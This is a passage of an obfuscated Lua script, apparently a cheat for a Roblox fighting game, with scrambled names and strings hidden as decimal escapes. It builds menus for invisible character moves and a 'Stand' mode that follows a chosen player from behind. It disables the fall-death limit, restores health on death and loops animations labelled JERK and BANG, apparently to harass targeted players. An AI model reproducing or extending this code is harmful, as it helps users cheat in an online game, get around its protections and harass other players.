 elseif _lIllIlIIll == "\068\111\110\039\116\032\070\111\108\108\111\119" then _IllIIIlIIl = false local _llIlIlIIll = _IlIllIIllI.StandTargetDropdown and _IlIllIIllI.StandTargetDropdown.Value or "" local _IIIlIlIIll = _IlIllIIIII(tostring(_llIlIlIIll)) if _IIIlIlIIll then _llIlllllll(_IIIlIlIIll) if _llIIlIIllI then _llIIlIIllI:Disconnect() _llIIlIIllI = nil end
 pcall( function () local _IlIIIlIIII = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then _IlIIIlIIII.PlatformStand = false end
 end
 ) else _IllIIlIIll:Notify({ Title = _lIllIllIII("\083\116\097\110\100"), Content = "\080\108\101\097\115\101\032\115\101\108\101\099\116\032\097\032\118\097\108\105\100\032\116\097\114\103\101\116\032\102\105\114\115\116\046", _IllIIlIlll = 0x3 }) pcall( function () _IlIllIIllI.StandMethodDropdown:SetValue("\079\102\102") end
 ) end
 end
 end
 , }) do local _llllIIlIIl = { "\082\097\110\100\111\109" } for _lllIlllIIl, _lIIIIIIIII in ipairs(_lIllllIllI) do _llllIIlIIl[#_llllIIlIIl + 0x1] = _lIIIIIIIII.name end
 _lllIIIIlIl:AddDropdown("\083\116\097\110\100\073\100\108\101\065\110\105\109\068\114\111\112\100\111\119\110", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110", Values = _llllIIlIIl, Default = "\082\097\110\100\111\109", Callback = function () if _IIIIllIIlI and _IllIIIlIIl then if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 if _IIlIlllIII then pcall( function () _IIlIlllIII:Stop(0x0) end
 ) _IIlIlllIII = nil end
 _IIIIIllIlI = 0x0 task.defer(_lllIIlIllI) end
 end
 , }) end
 _lllIIIIlIl:AddLabel("\072\111\119\032\116\111\032\117\115\101\032\083\116\097\110\100\058", true) _lllIIIIlIl:AddLabel("\083\101\108\101\099\116\032\097\032\116\097\114\103\101\116\032\097\110\100\032\099\104\111\111\115\101\032\070\111\108\108\111\119\032\111\114\032\068\111\110\039\116\032\070\111\108\108\111\119\046", true) _lllIIIIlIl:AddLabel("\083\116\097\110\100\032\097\116\116\097\099\104\101\115\032\098\101\104\105\110\100\032\116\104\101\032\116\097\114\103\101\116\032\097\110\100\032\109\105\114\114\111\114\115\032\116\104\101\105\114\032\112\111\115\105\116\105\111\110\046", true) _lllIIIIlIl:AddLabel("\051\032\098\108\111\099\107\115\032\105\110\032\097\032\114\111\119\032\102\114\111\109\032\116\104\101\032\116\097\114\103\101\116\032\116\111\103\103\108\101\115\032\116\104\101\032\109\111\100\101\046", true) _lllIIIIlIl:AddLabel("\087\104\101\110\032\121\111\117\032\117\115\101\032\097\032\109\111\118\101\032\097\110\100\032\116\104\101\032\116\097\114\103\101\116\032\104\097\115\032\116\104\097\116\032\109\111\118\101\032\111\110\032\099\111\111\108\100\111\119\110\044\032\083\116\097\110\100\032\097\117\116\111\045\117\115\101\115\032\105\116\046", true) _lllIIIIlIl:AddLabel("\073\110\032\068\111\110\039\116\032\070\111\108\108\111\119\032\109\111\100\101\044\032\121\111\117\032\115\116\097\121\032\105\110\032\112\108\097\099\101\046\032\083\116\097\110\100\032\111\110\108\121\032\097\099\116\115\032\100\117\114\105\110\103\032\121\111\117\114\032\109\111\118\101\115\046", true) local function _IlIlllIllI() getgenv()._standActivateFn = function (_IIlIllIllI) _llIlllllll(_IIlIllIllI) _IlIlllIllI() end
 getgenv()._standDeactivateFn = function () _lllIIlIIII() _IlIlllIllI() end
 end
 _IlIlllIllI() end
 _lllIIIlIll:AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\110", Callback = function () for _IIlIIllIlI, _lIIIIIIIII in pairs(_IIlIlIIlIl) do if _IIlIIllIlI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIIIIIIIII.Type == "\084\111\103\103\108\101" then _lIIIIIIIII:SetValue(true) end
 end
 for _IIlIIllIlI, _lIIIIIIIII in pairs(_IlIllIIllI) do if _IIlIIllIlI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIIIIIIIII.Type == "\068\114\111\112\100\111\119\110" then local _IIlIIIllIl = {} for _lllIlllIIl, _lIllIlIIll in pairs(_lIIIIIIIII.Values) do _IIlIIIllIl[_lIllIlIIll] = true end
 _lIIIIIIIII:SetValue(_IIlIIIllIl) end
 end
 end
 , }):AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\102\102", Callback = function () for _IIlIIllIlI, _lIIIIIIIII in pairs(_IIlIlIIlIl) do if _IIlIIllIlI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIIIIIIIII.Type == "\084\111\103\103\108\101" then _lIIIIIIIII:SetValue(false) end
 end
 for _IIlIIllIlI, _lIIIIIIIII in pairs(_IlIllIIllI) do if _IIlIIllIlI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIIIIIIIII.Type == "\068\114\111\112\100\111\119\110" then _lIIIIIIIII:SetValue({}) end
 end
 end
 , }) _lllIIIlIll:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107", { Text = "\073\110\118\105\115\105\098\108\101\032\066\108\111\099\107", Default = false, }) _lllIIIlIll:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114", { Text = "\066\108\111\099\107\032\067\111\108\111\114", Default = false, }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\049", { Default = Color3.fromRGB(0x0, 0xFF, 0xFF), Title = "\083\116\097\114\116", }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\050", { Default = Color3.fromRGB(0x0, 0x0, 0xFF), Title = "\077\105\100\100\108\101", Transparency = 0x0, }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\051", { Default = Color3.fromRGB(0xFF, 0x0, 0x0), Title = "\069\110\100", Transparency = 0x0, }) _lllIIIlIll:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\067\111\117\110\116\101\114", { Text = "\073\110\118\105\115\105\098\108\101\032\067\111\117\110\116\101\114", Default = false, }) _lllIIIlIll:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\067\111\117\110\116\101\114\072\105\116", { Text = "\073\110\118\105\115\105\098\108\101\032\067\111\117\110\116\101\114\032\072\105\116", Default = false, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\097\105\116\097\109\097", { Text = "\073\110\118\105\115\105\098\108\101\032\083\097\105\116\097\109\097", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\084\097\098\108\101\032\070\108\105\112", "\073\110\118\105\115\105\098\108\101\032\083\101\114\105\111\117\115\032\080\117\110\099\104", "\073\110\118\105\115\105\098\108\101\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\071\097\114\111\117", { Text = "\073\110\118\105\115\105\098\108\101\032\071\097\114\111\117", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\111\110\105\099", { Text = "\073\110\118\105\115\105\098\108\101\032\083\112\101\101\100\045\111\039\045\083\111\110\105\099", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\071\101\110\111\115", { Text = "\073\110\118\105\115\105\098\108\101\032\071\101\110\111\115", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\073\110\099\105\110\101\114\097\116\101" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\084\097\116\115\117\109\097\107\105", { Text = "\073\110\118\105\115\105\098\108\101\032\084\097\116\115\117\109\097\107\105", Values = { "\073\110\118\105\115\105\098\108\101\032\067\114\117\115\104\105\110\103\032\080\117\108\108", "\073\110\118\105\115\105\098\108\101\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121", "\073\110\118\105\115\105\098\108\101\032\083\116\111\110\101\032\071\114\097\118\101", "\073\110\118\105\115\105\098\108\101\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104", "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111", "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\065\116\111\109\105\099\083\097\109\117\114\097\105", { Text = "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105", Values = { "\073\110\118\105\115\105\098\108\101\032\065\116\109\111\115\032\067\108\101\097\118\101", "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\083\117\110\115\101\116", "\073\110\118\105\115\105\098\108\101\032\083\111\108\097\114\032\067\108\101\097\118\101", "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101", "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101\032\070\105\110\105\115\104\101\114", "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104", "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _lllIIIlIll:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\117\105\114\121\117", { Text = "\073\110\118\105\115\105\098\108\101\032\083\117\105\114\121\117", Values = { "\066\117\108\108\101\116\032\066\097\114\114\097\103\101" }, Multi = true, Default = {}, Searchable = true, }) local _lIIIIIIIII = { L_KEY = { Id = "\049\050\049\053\055\050\050\049\052", Speed = 0x1, StartTime = 0.5, Track = nil, IsActive = false }, F2_KEY = { Id = "\049\055\057\050\050\052\050\051\052", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false }, TPOSE_A = { Id = "\049\053\053\048\051\048\048\052\057\048\048", Speed = 0x0, StartTime = 1.6, Track = nil, IsActive = false }, JERK = { Id = "\055\050\048\052\050\048\050\052", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false }, BANG = { Id = "\049\052\056\056\052\048\051\055\049", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false, Priority = Enum.AnimationPriority.Action4 }, WAVE = { Id = "\049\050\056\055\055\055\057\055\051", Speed = 0x1, StartTime = 0x0, Track = nil }, POINT = { Id = "\049\050\056\056\053\051\051\053\055", Speed = 0x1, StartTime = 0x0, Track = nil }, HAPPY = { Id = "\049\050\057\052\050\051\048\051\048", Speed = 0x1, StartTime = 0x0, Track = nil }, LAUGH = { Id = "\049\050\057\052\050\051\049\051\049", Speed = 0x1, StartTime = 0x0, Track = nil }, MUSTACHE = { Id = "\054\053\048\054\055\056\049\051", Speed = 0x0, StartTime = 0.2, Track = nil, IsActive = false, Priority = Enum.AnimationPriority.Action4 }, } local _IIllIlIIlI = { ["\049\050\049\053\055\050\050\049\052"] = 1e13, ["\055\050\048\052\050\048\050\052"] = 1e13, ["\049\055\057\050\050\052\050\051\052"] = -1e9, ["\049\053\053\048\051\048\048\052\057\048\048"] = 1e7, ["\049\056\048\052\051\053\053\055\049"] = 1e5, ["\049\052\056\056\052\048\051\055\049"] = -1e9, ["\054\053\048\054\055\056\049\051"] = -1e9, ["\049\050\056\055\055\055\057\055\051"] = -1e9, ["\049\050\056\056\053\051\051\053\055"] = -1e9, ["\049\050\057\052\050\051\048\051\048"] = -1e9, ["\049\050\057\052\050\051\049\051\049"] = -1e9, } local _IlllIIIllI = 0.1 local Players = game:GetService("\080\108\097\121\101\114\115") local RunService = game:GetService("\082\117\110\083\101\114\118\105\099\101") local _lIlIIlIlII = game:GetService("\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101") local _llIIIlIIll = Players.LocalPlayer local _lIIIIllIIl local _lIIIlIIIII = nil local _llIIIIllll = false local _llllllIlll = {} local _lllIllIIIl = {} local _lIllIIIIlI = false local _lllIlIIIII = nil local _IIlIllIIII = nil local _lIlIIIlIll = nil local _lllllIIIIl = false local _lIIIIlIlIl = nil local _llllllIllI = nil local _lllIlIIIIl = nil local _llIlIlIlII = {_IIIlIlIIll = nil, _lllIIlllll = nil} local _llllIIIIlI = {} local _IIlllIIlll = _IlllIlIllI and game:GetService("\083\116\097\114\116\101\114\080\108\097\121\101\114"):FindFirstChild("\083\116\097\114\116\101\114\067\104\097\114\097\099\116\101\114") or nil local _IllIllIIlI = true local _IlIIllIIII = {} local _IIllIlIlIl = false _IllllllllI = nil local _IIlllllIll = false local _IlIIlIlIII = false local _lIIIllIlll = function () end
 local _lIIlIlllIl = function () end
 local _IlIIlIllIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), } local _lIllIlllll = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } getgenv().InvisActive = false getgenv().FUCActive = false getgenv().OldPos = nil getgenv().FPDH = workspace.FallenPartsDestroyHeight workspace.FallenPartsDestroyHeight = 0x0/0x0 local _IlIllIlIll = workspace:GetPropertyChangedSignal("\070\097\108\108\101\110\080\097\114\116\115\068\101\115\116\114\111\121\072\101\105\103\104\116"):Connect( function () local _IlIIIIlIIl = workspace.FallenPartsDestroyHeight if _IlIIIIlIIl == _IlIIIIlIIl then workspace.FallenPartsDestroyHeight = 0x0/0x0 end
 end
 ) local _IllllIIlII = Instance.new("\080\097\114\116", workspace) _IllllIIlII.CFrame = CFrame.new(0x0, -0x2718, 0x0) _IllllIIlII.Anchored = true _IllllIIlII.Size = Vector3.new(0x800, 0xA, 0x800) _IllllIIlII.Transparency = 0.5 _IllllIIlII.CanCollide = true _IllllIIlII.Name = game:GetService("\072\116\116\112\083\101\114\118\105\099\101"):GenerateGUID() local _lllIIlIllI = 0x64 local _IllIllllIl = nil local _IlIllIllII = nil local _IlIIlIlllI = nil local function _IIIIIIllII(_IIllllIlII) if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _IlIIIlIIII or not _llIIlIIlII then return end
 _lllIIlIllI = _IlIIIlIIII.Health if _IllIllllIl then _IllIllllIl:Disconnect() _IllIllllIl = nil end
 if _IlIllIllII then _IlIllIllII:Disconnect() _IlIllIllII = nil end
 _IlIllIllII = RunService.RenderStepped:Connect( function () local _IlIIIIIIll = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then _lllIIlIllI = _IlIIIlIIII.Health _IllllIIlII.CFrame = CFrame.new(_IlIIIIIIll.Position.X, -0x2718, _IlIIIIIIll.Position.Z) end
 end
 ) _IllIllllIl = _IlIIIlIIII.HealthChanged:Connect( function (hp) local _IlIIIIIIll = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if hp <= 0x0 and _IlIIIIIIll and _IlIIIIIIll.CFrame.Y <= 0x0 then _IlIIIlIIII.Health = _lllIIlIllI end
 end
 ) end
 _IIIIIIllII(_llIIIlIIll.Character) _IlIIlIlllI = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _IIIIIIllII(_IIllllIlII) end
 ) local _lllllllIlI = nil local _lIIlIlIIII = nil local _llIIllIIIl = nil local _lIIIIllIlI = false local _llIlllIlIl = {} local _lIlIIlIlII = {} local _IIlllIlIlI = setmetatable({}, { __mode = "\107" }) local function _lIIIlIlllI(_IIllllIlII) if not _IIllllIlII then return nil end
 local _llIIIllIlI = _IIllllIlII:FindFirstChild("\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110") if _llIIIllIlI then return _llIIIllIlI end
 local _IIlIIIlIII = Instance.new("\070\111\108\100\101\114") _IIlIIIlIII.Name = "\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110" pcall( function () _IIlIIIlIII:SetAttribute("\082\101\118\101\110\097\110\116\079\119\110\101\100", true) end
 ) _IIlIIIlIII.Parent = _IIllllIlII _IIlllIlIlI[_IIlIIIlIII] = true return _IIlIIIlIII end
 local function _lIlIIllIII(_IIllllIlII) if not _IIllllIlII then return end
 _lIIIlIlllI(_IIllllIlII) local _IllIIIllII = _IIllllIlII.ChildRemoved:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name == "\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110" and getgenv().RevenantLoaded then task.defer(_lIIIlIlllI, _IIllllIlII) end
 end
 ) table.insert(_lIlIIlIlII, _IllIIIllII) end
 _lIlIIllIII(_llIIIlIIll.Character) table.insert(_lIlIIlIlII, _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _lIlIIllIII(_IIllllIlII) end
 )) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IllIIIllII in ipairs(_lIlIIlIlII) do pcall( function () _IllIIIllII:Disconnect() end
 ) end
 _lIlIIlIlII = {} local _IIllllIlII = _llIIIlIIll.Character local _IIlIIIlIII = _IIllllIlII and _IIllllIlII:FindFirstChild("\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110") if _IIlIIIlIII and (_IIlllIlIlI[_IIlIIIlIII] or _IIlIIIlIII:GetAttribute("\082\101\118\101\110\097\110\116\079\119\110\101\100")) then pcall( function () _IIlIIIlIII:Destroy() end
 ) end
 end
 ) if getgenv()._standDeactivateFn then table.insert(_llIlllIlIl, getgenv()._standDeactivateFn) end
 local _lllIllllIl = nil local function _lIIlIIlIll() return _lIlIIlIlII:GetFocusedTextBox() ~= nil end
 local function _IllIlIlIII(_lllIIlllll) local _lIIlIIIlII, _IllllIllII = pcall( function () return _lllIIlllll.DisplayName end
 ) if not _lIIlIIIlII or not _IllllIllII or _IllllIllII == "" then return _lllIIlllll.Name end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _lllIIlllll and _IIIIIlIlll.DisplayName == _IllllIllII then return _lllIIlllll.Name end
 end
 return _IllllIllII end
 local function _lIlIlllllI() local _IIIlllIlIl = {} for _lllIlllIIl, _lIIIIIIIII in pairs(Players:GetPlayers()) do if _lIIIIIIIII ~= _llIIIlIIll then _IIIlllIlIl[#_IIIlllIlIl+0x1] = _IIIlllIIll(_lIIIIIIIII) end
 end
 return _IIIlllIlIl end
 local function _llIIlllllI(_lIIIllIIII) return _IlIllIIIII(_lIIIllIIII) end
 local function _IlIIIlllII() if _lllllllIlI then _lllllllIlI:Disconnect() _lllllllIlI = nil end
 if _lIIlIlIIII then _lIIlIlIIII:Disconnect() _lIIlIlIIII = nil end
 end
 local function _lIlIIIIlIl(_IIlIllIllI) if not _IIlIllIllI or not _IIlIllIllI.Parent then return end
 _IlIIIlllII() if _IIlIllIllI.Character then pcall( function () _lIIIIllIlI = true workspace.CurrentCamera.CameraSubject = _IIlIllIllI.Character _lIIIIllIlI = false end
 ) end
 _lllllllIlI = _IIlIllIllI.CharacterAdded:Connect( function () repeat task.wait() until _IIlIllIllI.Character and _IIlIllIllI.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") pcall( function () _lIIIIllIlI = true workspace.CurrentCamera.CameraSubject = _IIlIllIllI.Character _lIIIIllIlI = false end
 ) end
 ) _lIIlIlIIII = workspace.CurrentCamera:GetPropertyChangedSignal("\067\097\109\101\114\097\083\117\098\106\101\099\116"):Connect( function () if _lIIIIllIlI then return end
 if not _IIlIllIllI or not _IIlIllIllI.Parent then _IlIIIlllII() pcall( function () workspace.CurrentCamera.CameraSubject = _llIIIlIIll.Character end
 ) return end
 if _IIlIllIllI.Character then pcall( function () _lIIIIllIlI = true workspace.CurrentCamera.CameraSubject = _IIlIllIllI.Character _lIIIIllIlI = false end
 ) end
 end
 ) end
 local function _IllIlIIIII() _IlIIIlllII() pcall( function () workspace.CurrentCamera.CameraSubject = _llIIIlIIll.Character end
 ) end
 local function _llIlllllll() _lllIllIIIl = {} for key, _IIIlIlIlIl in pairs(_lIIIIIIIII) do if key ~= "\087\065\086\069" and key ~= "\080\079\073\078\084" and key ~= "\072\065\080\080\089" and key ~= "\076\065\085\071\072" and key ~= "\070\050\095\075\069\089" then _lllIllIIIl[key] = _IIIlIlIlIl.IsActive end
 end
 _lllIllIIIl["\095\095\084\080\111\115\101\065\099\116\105\118\101"] = _lIllIIIIlI end
 local function _llllIllIlI() if not next(_lllIllIIIl) then return end
 local _IIllllIlII = _llIIIlIIll.Character local _llIlllIllI = tick() + 0x2 while not _IIllllIlII and tick() < _llIlllIllI do task.wait(0.05) _IIllllIlII = _llIIIlIIll.Character end
 if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x1) if not _IlIIlIIlIl then return end
 local _IIIIlIIllI = _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _IlIIlIIlIl:WaitForChild("\065\110\105\109\097\116\111\114", 0x1) if not _IIIIlIIllI then return end
 task.wait(0.05) for key, _lIIIllIlIl in pairs(_lllIllIIIl) do if key:sub(0x1, 0x2) == "\095\095" then continue end
 if _lIIIllIlIl and not _lIIIIIIIII[key].IsActive then _lIIIIIIIII[key].IsActive = false task.spawn( function () _IIllIIIIII(_lIIIIIIIII[key]) end
 ) end
 end
 if _lllIllIIIl["\095\095\084\080\111\115\101\065\099\116\105\118\101"] and not _lIllIIIIlI then task.spawn(_llllIIlIlI) end
 end
 local function _llllIIIlll(_IIIlIlIlIl) if _IIIlIlIlIl.Track then _IIIlIlIlIl.Track:Stop() _IIIlIlIlIl.Track:Destroy() _IIIlIlIlIl.Track = nil end
 end
 local function _IllllllIlI() local _llIIIIllII = _lIIIIIIIII.TPOSE_A if _llIIIIllII.Track then pcall( function () if _llIIIIllII.Track.IsPlaying then _llIIIIllII.Track:Stop() end
 end
 ) pcall( function () _llIIIIllII.Track:Destroy() end
 ) _llIIIIllII.Track = nil end
 _IIlIllIIII = nil end
 local function _IlIlllllll(_IIIlIlIlIl, _IIIIlIIllI, priority, weight) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIlIlIlIl.Id local _llIIllIlIl = _IIIIlIIllI:LoadAnimation(_llllIlIllI) _llIIllIlIl.Priority = priority _llIIllIlIl.Looped = true _llIIllIlIl:Play() _llIIllIlIl:AdjustSpeed(0x0) if _IIIlIlIlIl.StartTime and _IIIlIlIlIl.StartTime > 0x0 then _llIIllIlIl.TimePosition = _IIIlIlIlIl.StartTime end
 pcall( function () _llIIllIlIl:AdjustWeight(weight or 1e8) end
 ) return _llIIllIlIl end
 local function _IllllIIIlI(_IIIlIlIlIl, looped, priority) looped = looped == nil and true or looped local _llllIllIII = _llIIIlIIll.Character if not _llllIllIII then return end
 local _IlIIlIIlIl = _llllIllIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIlIIlIl and _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 if _IIIlIlIlIl.Track and _IIIlIlIlIl.Track.IsPlaying then return _IIIlIlIlIl.Track end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIlIlIlIl.Id _IIIlIlIlIl.Track = _IIIIlIIllI:LoadAnimation(_llllIlIllI) local _IIlIIIIIlI = (_IIIlIlIlIl.Id == "\049\050\049\053\055\050\050\049\052" or _IIIlIlIlIl.Id == "\055\050\048\052\050\048\050\052") _IIIlIlIlIl.Track.Priority = _IIIlIlIlIl.Priority or (_IIlIIIIIlI and Enum.AnimationPriority.Action4 or Enum.AnimationPriority.Action3) _IIIlIlIlIl.Track.Looped = looped local _llllllllIl = _IIllIlIIlI[_IIIlIlIlIl.Id] if _llllllllIl then _IIIlIlIlIl.Track:AdjustWeight(_llllllllIl) end
 _IIIlIlIlIl.Track:Play() _IIIlIlIlIl.Track:AdjustSpeed(_IIIlIlIlIl.Speed) _IIIlIlIlIl.Track.TimePosition = _IIIlIlIlIl.StartTime return _IIIlIlIlIl.Track end
 local _lIlIlIllll = { WAVE=true, POINT=true, HAPPY=true, LAUGH=true, F2_KEY=true, TPOSE_A=true } local function _lIIlIIllII(exceptL_KEY, fromInvis) _llllllIlll = {} for key, _IIIlIlIlIl in pairs(_lIIIIIIIII) do if not _lIlIlIllll[key] then if exceptL_KEY and key == "\076\095\075\069\089" then continue end
 if fromInvis and (key == "\076\095\075\069\089" or key == "\074\069\082\075") then continue end
 if _IIIlIlIlIl.IsActive and _IIIlIlIlIl.Track and _IIIlIlIlIl.Track.IsPlaying then _llllllIlll[key] = true _IIIlIlIlIl.Track:Stop() end
 end
 end
 if _lIllIIIIlI then _llllllIlll["\084\080\079\083\069\095\065"] = true if _lllIlIIIII then _lllIlIIIII:Disconnect() _lllIlIIIII = nil end
 _IllllllIlI() _lIllIIIIlI = false if not fromInvis then pcall( function () if _IIlIlIIlIl.TogTPose then _lllIIIIllI.TPose = true _IIlIlIIlIl.TogTPose:SetValue(false) _lllIIIIllI.TPose = false end
 end
 ) end
 end
 end
 local function _llIlIllIlI(fromInvis) for key, _IIIlIlIlIl in pairs(_lIIIIIIIII) do if not _lIlIlIllll[key] then if fromInvis and (key == "\076\095\075\069\089" or key == "\074\069\082\075") then continue end
 if _llllllIlll[key] and _IIIlIlIlIl.IsActive then if _IIIlIlIlIl.Track then _IIIlIlIlIl.Track:Play() _IIIlIlIlIl.Track:AdjustSpeed(_IIIlIlIlIl.Speed) else _IllllIIIlI(_IIIlIlIlIl, true, Enum.AnimationPriority.Action4) end
 end
 end
 end
 if _llllllIlll["\084\080\079\083\069\095\065"] and not fromInvis and _IIlIlIIlIl.TogTPose and _IIlIlIIlIl.TogTPose.Value then _lIllIIIIlI = false _lllIlIIIII = RunService.Heartbeat:Connect( function () if getgenv().InvisActive or getgenv().FUCActive then return end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIlIIlIl = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIlIIlIl and _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 if _IIlIllIIII ~= _IIIIlIIllI then _IllllllIlI() _IIlIllIIII = _IIIIlIIllI _lIIIIIIIII.TPOSE_A.Track = _IlIlllllll(_lIIIIIIIII.TPOSE_A, _IIIIlIIllI, Enum.AnimationPriority.Action3, 1e12) return end
 local _llIIIIllII = _lIIIIIIIII.TPOSE_A if not _llIIIIllII.Track or not _llIIIIllII.Track.IsPlaying then if _llIIIIllII.Track then pcall( function () _llIIIIllII.Track:Destroy() end
 ) end
 _llIIIIllII.Track = _IlIlllllll(_llIIIIllII, _IIIIlIIllI, Enum.AnimationPriority.Action3, 1e12) end
 end
 ) _lIllIIIIlI = true end
 _llllllIlll = {} end
 local function _IIllIIIIII(_IIIlIlIlIl) _IIIlIlIlIl.IsActive = not _IIIlIlIlIl.IsActive if _IIIlIlIlIl.IsActive then _IllllIIIlI(_IIIlIlIlIl, true, Enum.AnimationPriority.Action4) else _llllIIIlll(_IIIlIlIlIl) end
 if _IIIlIlIlIl.IsActive and not _lIIIIllIIl then _lIIIIllIIl = RunService.Heartbeat:Connect( function () if _llIIIIllll then return end
 for key, _IlIllllIII in pairs(_lIIIIIIIII) do if not _lIlIlIllll[key] and _IlIllllIII.IsActive then if getgenv().InvisActive and key ~= "\076\095\075\069\089" and key ~= "\074\069\082\075" then continue end
 if not _IlIllllIII.Track or _IlIllllIII.Track.Parent == nil then _IllllIIIlI(_IlIllllIII, true, Enum.AnimationPriority.Action4) else if not _IlIllllIII.Track.IsPlaying then _IlIllllIII.Track:Play() end
 if key == "\076\095\075\069\089" and _IlIllllIII.Track.TimePosition < 0.1 then _IlIllllIII.Track.TimePosition = 0.5 end
 end
 end
 end
 end
